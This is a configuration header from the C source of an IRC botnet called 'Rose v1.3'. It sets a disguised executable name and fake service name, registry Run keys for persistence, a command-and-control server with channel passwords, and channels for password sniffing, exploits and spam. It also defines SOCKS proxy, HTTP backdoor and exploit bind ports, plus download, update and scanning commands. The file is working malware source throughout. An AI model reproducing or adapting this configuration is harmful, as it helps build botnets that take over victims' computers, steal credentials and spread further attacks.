char version[] = "Rose v1.3 2007 by DreamWoRK";
char botid[] = "bebeimm";

char filename[] = "msmsgrs.exe";
char valuename[] = "Intec Service Drivers";


BOOL rndfilename = FALSE;
BOOL regrun = TRUE;
char prefix = '.';
int cryptkey = 0;

const int maxaliases = 16;
const int maxlogins = 3;

int maxrand = 9;
char nickconst[] = "";
BOOL nickprefix = TRUE;
int nicktype = CONSTNICK;

//host auth
char *authost[] = {"*@CYBER-TERROR.COM", "\0"};

//cftp
char lsaip[] = "192.188.1.1";                    // cftp host ".lsahost 192.168.1.1"
char lsaport[] = "12345";			// cftp port ".lsaport 6969"
char lsuser[] = "admin";
char lspass[] = "admin";

// server configuration
char server[] = "load.load.com"; // server
char server2[] = ""; // backup server (dont use semi-gay. bleah)

// ports
int port = 1863; // server port
int port2 = 1866; // backup server port (dont use. gay. bleah)
int tftpport = 69;

char serverpass[] = ""; // server password

int socks4port = 7561; // socks4 server port.

// channel configuration
char password[] = "boffi";
char channel[] = "#ASN#";
char chanpass[] = "privat";
char channel2[] = "";
char chanpass2[] = "";
BOOL topiccmd = TRUE;
char psniffchan[] = "#ASN#Sniff";
char exploitchan[] = "#ASN#Exp";
char spamchan[]	= "#ASN#Spam";

//reg keys
char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";


//custom commands
const char slogin[]="login";
const char sremove[]="remove";
const char supdate[]="update";
const char sdownload[]="download";
const char sadvscan[]="asc";

//httpd backdoor functions
int httpport = 2006;
unsigned short bport = 4460;		// bindport for exploits